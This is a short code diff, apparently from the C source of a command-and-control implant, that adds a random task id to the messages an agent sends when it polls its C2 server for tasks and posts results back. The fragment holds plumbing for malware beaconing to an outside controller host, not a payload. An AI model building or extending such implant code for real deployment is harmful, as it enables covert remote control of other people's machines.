@@ -90,7 +90,7 @@ static BOOL SendTaskResult(
 		CopyMemory(payload + sizeof(resultHeader), resultData, resultLength);
 	}
 
-	success = SendTlvMessage(sock, MSG_AGENT_POST_RESULT, payloadLength, payload);
+	success = SendTlvMessage(sock, (USHORT)taskId, MSG_AGENT_POST_RESULT, payloadLength, payload);
 	ImplantHeapFree(payload);
 
 	return success;
@@ -112,14 +112,18 @@ static VOID PollServerOnce(VOID)
 	PBYTE commandResult = NULL;
 	DWORD commandResultLength = 0;
 	DWORD commandStatus = NO_ERROR;
+	UINT taskId = 0;
 
 	if (!NetworkInit(G_C2Host, G_C2Port, &sock))
 	{
 		return;
 	}
 
+	rand_s(&taskId);
+
 	if (!SendTlvMessage(
 		sock,
+		(USHORT)taskId,
 		MSG_AGENT_GET_TASK,
 		sizeof(getTaskRequest),
 		(CONST PBYTE)&getTaskRequest
